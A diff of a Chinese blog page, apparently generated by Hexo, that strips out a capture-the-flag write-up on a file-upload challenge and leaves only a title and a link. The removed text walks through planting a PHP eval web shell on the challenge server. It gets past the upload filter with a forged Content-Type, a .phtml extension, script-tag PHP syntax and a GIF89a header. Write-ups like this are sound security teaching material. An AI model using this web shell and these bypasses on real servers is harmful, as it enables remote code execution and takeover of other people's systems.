@@ -168,53 +168,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h3 id="极客大挑战-2019-Upload-1"><a href="#极客大挑战-2019-Upload-1" class="headerlink" title="极客大挑战 2019]Upload 1"></a>极客大挑战 2019]Upload 1</h3><ol>
-<li><p>构造1.php文件，内容<?php eval($_POST[1]);?></p>
-</li>
-<li><p>报错，检查后发现网页源代码没有过滤代码，考虑抓包</p>
-</li>
-<li><p>上传时抓包<img src="/.com//ayZmhKos-16626432579102" alt="1"></p>
-</li>
-<li><p>修改</p>
-</li>
-</ol>
-<p>content-type:  image&#x2F;png</p>
-<p>出错 NOT!PHP!</p>
-<ol start="5">
-<li>不是PHP，试试其他后缀</li>
-</ol>
-<p>​            绕过后缀的有文件格式有php,php3,php4,php5,phtml.pht，这些后缀名都可以被当做php文件执行(需要配            置文件里面的支持)</p>
-<p>​            phtml一般是指嵌入了php代码的html文件，但是同样也会作为php解析</p>
-<p>​            PHT文件是一个HTML页面，其中包括一个PHP脚本</p>
-<ol start="6">
-<li>只有phtml可以</li>
-</ol>
-<p>在后面添<?php eval($_POST[1]);?></p>
-<p>显示文件内包含&lt;?</p>
-<ol start="6">
-<li><p>改写</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">php4种常见风格标签写法</span><br><span class="line">  <span class="number">1</span>：正常写法xml格式</span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;1111&#x27;</span>;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br><span class="line">   </span><br><span class="line">  <span class="number">2</span>:短标签</span><br><span class="line">  <span class="meta">&lt;?</span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;1111&#x27;</span>;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br><span class="line">   </span><br><span class="line">      <span class="number">5.4</span> 起 <span class="meta">&lt;?=</span> <span class="string">&#x27;hello&#x27;</span>; === <span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">   </span><br><span class="line">  <span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span></span><br><span class="line">  就相当于</span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?</span>需要 php.ini 配置文件中的指令 short_open_tag 打开后才可用，或者在 PHP 编译时加入了 --        enable-short-tags 选项。</span><br><span class="line">  而自 PHP5.<span class="number">4</span> 起，短格式的 <span class="keyword">echo</span> 标记 <span class="meta">&lt;?=</span> 总会被识别并且合法，而不管 short_open_tag 的设置是什    么。</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">  <span class="number">3</span>:asp风格写法</span><br><span class="line">  &lt;%</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;1111&#x27;</span>;  </span><br><span class="line">  %&gt;</span><br><span class="line">  (注释：这种写法在php配置中默认关闭了的,如果要正常输出，需要配置php.ini文件。在配置文件中找到        asp_tags=off ,将off改为on。改动配置文件后需要重启apache。)但是在php7之后被移除了</span><br><span class="line">   </span><br><span class="line">  <span class="number">4</span>:长标签风格</span><br><span class="line">   </span><br><span class="line">  &lt;script language=<span class="string">&quot;php&quot;</span>&gt;</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">  XXXXXX</span><br><span class="line">   </span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">   在php7之后被移除了 </span><br></pre></td></tr></table></figure>
-
-<p> 摘自CSDN博主「_Monica_」的原创文章<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46918279/article/details/120297936">https://blog.csdn.net/qq_46918279/article/details/120297936</a></p>
-<p>用最后一种</p>
-</li>
-</ol>
-<p>​        输入<script language="php"> eval($_POST[1]);</script></p>
-<ol start="7">
-<li>还是不行，伪造头部</li>
-</ol>
-<p>GIF89a<script language="php"> eval($_POST[1]);</script></p>
-<p><img src="/.com//SlkWoklD" alt="2"></p>
-<ol start="8">
-<li>回到浏览器打开1.phtml文件</li>
-</ol>
-<p>格式为：url&#x2F;upload&#x2F;文件名</p>
-<ol start="9">
-<li><img src="/.com//3NLo47sH" alt="3"></li>
-<li>打开flag</li>
-</ol>
-<p><img src="/.com//9uSHNfuv" alt="4"></p>
-
+        <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h3 id="极客大挑战-2019-Upload-1"><a href="#极客大挑战-2019-Upload-1" class="headerlink" title="极客大挑战 2019]Upload 1"></a>极客大挑战 2019]Upload 1</h3>
+        
+          <a class="article-more-a" href="/2022/09/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#more">more >></a>
+        
       
 
       
